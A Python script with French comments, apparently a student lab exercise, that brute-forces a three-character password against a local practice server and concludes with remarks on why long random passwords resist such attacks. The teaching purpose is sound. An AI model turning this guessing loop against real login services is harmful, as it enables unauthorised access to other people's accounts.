#!/usr/bin/env python3

import requests
import itertools
import time

# ---------------- Configuration par défaut ----------------
SERVER_URL = "http://127.0.0.1:5000"

# ---------------- Fonctions utilitaires ----------------
# Envoi d'une réponse au serveur web
def send_answer(session_id, attempt, captcha_id=None, captcha_answer=None):
    payload = {
        "session_id": session_id,
        "attempt": attempt
    }
    if captcha_id:
        payload["captcha_id"] = captcha_id
        payload["captcha_answer"] = captcha_answer
    r = requests.post(f"{SERVER_URL}/attempt", json=payload)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, r.text

# Récupération d'une nouvelle session
def api_new_session(tp, class_key, server_url=SERVER_URL):
    payload = {"tp": tp, "class_key": class_key}
    r = requests.post(f"{server_url}/new_session", json=payload)
    if r.status_code in (200, 201):
        j = r.json()
        return j.get("session_id")
    else:
        raise RuntimeError(f"Erreur création session {r.status_code}: {r.text}")


# ---------------- TP2: Bruteforce charset 3 caractères ----------------
def bruteforce(session_id):
    charset = "0123456789abcdefghijklmnopqrstuvwxyz"
    length = 3
    for idx, tpl in enumerate(itertools.product(charset, repeat=length)):
        candidate = ''.join(tpl)
        status, resp = send_answer(session_id, candidate)
        if status == 200 and isinstance(resp, dict) and resp.get("success") is True:
            print("Trouvé :", candidate)
            return candidate
        time.sleep(0.001)
    print("Non trouvé.")
    return None

if __name__ == "__main__":
    session = api_new_session(2, "0ter1a_s3cr3t", server_url=SERVER_URL)    
    bruteforce(session)


# Conclusion
# Le bruteforce devient très rapidement quelque chose de très long
# Point positif : Vos mots de passe (sous réserve d'être assez long et aléatoire) ne devraient pas être cassable
# Point négatif : À part avec des énormes machines, ce vecteur d'attaque est inutilisable
# À noter : Si on arrive à réduire le nombre de possibilités, alors cela redevient viable